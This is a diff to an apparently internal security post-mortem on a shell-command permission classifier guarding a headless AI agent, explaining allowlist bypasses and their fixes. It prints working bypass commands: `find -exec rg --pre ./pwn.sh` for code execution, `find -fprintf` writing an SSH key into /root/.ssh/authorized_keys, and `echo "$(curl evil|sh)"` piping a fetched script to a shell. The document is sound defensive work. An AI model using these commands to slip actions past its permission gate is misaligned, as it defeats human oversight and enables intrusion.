@@ -7,7 +7,7 @@ component: permission-classifier
 problem_type: security_issue
 category: security-issues
 severity: critical
-tags: [permissions, policy, bash, regex, heredoc, allow-list, rce, symlink, toctou, command-substitution, claude-pilot-25, claude-pilot-34, claude-pilot-35]
+tags: [permissions, policy, bash, regex, heredoc, allow-list, rce, symlink, toctou, command-substitution, find-exec, claude-pilot-25, claude-pilot-33, claude-pilot-34, claude-pilot-35]
 applies_when: "adding or reviewing any rule that decides allow/deny on a raw shell command string"
 ---
 
@@ -196,6 +196,56 @@ comment — the next reader trusts it. State what the check *actually* rejects
 (literal `../`, absolute, `~`, shell-expansion) and disclose what it does not
 (symlink traversal), with a pointer to the layer that does.
 
+### 6. A command allowlist is only as sound as the read-only PREMISE of each entry — and must cover the command's WHOLE mutating action set
+
+claude-pilot#33 relaxed tier1's blanket `find -exec` deny into a closed-world
+allowlist of read-only inner commands (`FIND_EXEC_SAFE_COMMANDS` — `grep`, `cat`,
+`ls`, …) so legitimate `find … -exec grep -l` stops wedging the headless pilot.
+The closed-world *shape* was right (§4). Two things the *name-level* enumeration
+missed — both found by executed-exploit review (§3), neither by reading the diff:
+
+**(a) "Safe-looking" names are not safe binaries.** An entry belongs on a
+read-only allowlist only if the binary cannot exec another command or write a
+file **through its own flags** — which the gate deliberately does not parse.
+Two allowlist entries violated that:
+
+- `rg` (ripgrep) has `--pre <CMD>` / `--hostname-bin` / `--search-zip`, which run
+  external commands. `find … -exec rg --pre ./pwn.sh X {} \;` was a **proven-live
+  RCE** (ran an attacker script). Removed `rg`; the native Grep tool covers the
+  use case. *This was newly reachable* — standalone `rg` was never on
+  `SAFE_SHELL_COMMANDS`, so relaxing the find path is what exposed it.
+- `grep`/`egrep`/`fgrep` are read-only **only under GNU grep**. `ugrep` (a drop-in
+  `grep` on some Gentoo/BSD/Homebrew hosts) adds `--filter=CMD` / `--pager` /
+  `--view`. Kept (the founding use case *is* `find -exec grep`), but the GNU-grep
+  assumption is now a documented **load-bearing precondition** in the allowlist
+  comment, with claude-pilot#44 tracking the runtime grep-provider check.
+
+```python
+# WRONG — "they're search tools, they're read-only"
+FIND_EXEC_SAFE_COMMANDS = {"grep", "rg", "cat", ...}   # rg --pre <cmd> => RCE
+
+# RIGHT — each entry verified to have no exec/write flag; risky entry dropped,
+# environmental precondition documented next to the survivors.
+FIND_EXEC_SAFE_COMMANDS = {"grep", "egrep", "fgrep", "cat", ...}  # GNU-grep precondition; rg removed
+```
+
+**(b) Guard the command's ENTIRE mutating action set, not just the obvious
+actions.** The first `_is_safe_find_command` guarded `-delete` and the exec-class
+flags (`-exec`/`-execdir`/`-ok`/`-okdir`) — and treated *everything else* as a
+"pure read-only search." But `find` has file-**write** actions that are neither
+exec nor delete: `-fprintf FILE FORMAT` writes attacker-controlled content to an
+arbitrary path (`-fprint`/`-fprint0`/`-fls` write listings). `find -fprintf
+/root/.ssh/authorized_keys "ssh-rsa …"` auto-approved — an arbitrary file-write
+primitive (proven vs real bash). When a single command exposes several mutating
+actions, enumerate the action set **closed-world and deny the unknown** — the
+fall-through must be deny, not "assume read-only." Fixed by denying the write
+actions alongside `-delete`.
+
+The unifying rule: a closed-world allowlist fails open in two places a name list
+hides — an *entry* whose own flags exec/write, and an *action* of a multi-action
+command that the guard didn't enumerate. Verify the premise of each entry; deny
+the unknown action.
+
 ## When to Apply
 
 - Adding/reviewing any `permissions.yaml` rule, or any code deciding allow/deny on
@@ -203,6 +253,10 @@ comment — the next reader trusts it. State what the check *actually* rejects
 - Relaxing the substitution veto: the only safe shape is a closed-world allowlist of
   whole-token literals redacted to an inert placeholder, never a validator that lexes
   the substitution's inner command (§4).
+- Adding any command to a tier1/policy allowlist: confirm the binary has no
+  exec/write flag (§6a — `rg --pre`, `ugrep --filter`, GNU vs non-GNU provider),
+  and if the command has multiple actions (like `find`), confirm the guard
+  enumerates its whole mutating action set and denies the unknown (§6b).
 - Reviewing `tier1.py` / `policy.py` / `permissions.py` in claude-pilot.
 
 ## Related
@@ -214,6 +268,12 @@ comment — the next reader trusts it. State what the check *actually* rejects
   (`contains_unquoted_metacharacter` mirrors tier1; mika#944/#946). The
   denylist-incompleteness and the `awk`/`sed`/`find` `system()`-exec gap likely
   exist symmetrically there.
+- **Open follow-ups from §6 (claude-pilot#33):** claude-pilot#41 — the broader
+  `contains_unquoted_metacharacter` gap (it misses `$()`/backtick **inside double
+  quotes**, so `echo "$(curl evil|sh)"` auto-approves on the non-find path;
+  another paired-audit candidate with the Rust scanner). claude-pilot#44 — verify
+  the pilot container's `grep` provider is GNU grep, the load-bearing precondition
+  for keeping `grep`/`egrep`/`fgrep` on `FIND_EXEC_SAFE_COMMANDS`.
 - Accepted residuals (not bugs): in-worktree code execution (`node ./build.js`,
   `cargo test`, `uv run pytest` run project code — the worktree is the trust
   boundary); `npm install`/`uv add` run package scripts; **symlink/TOCTOU on any
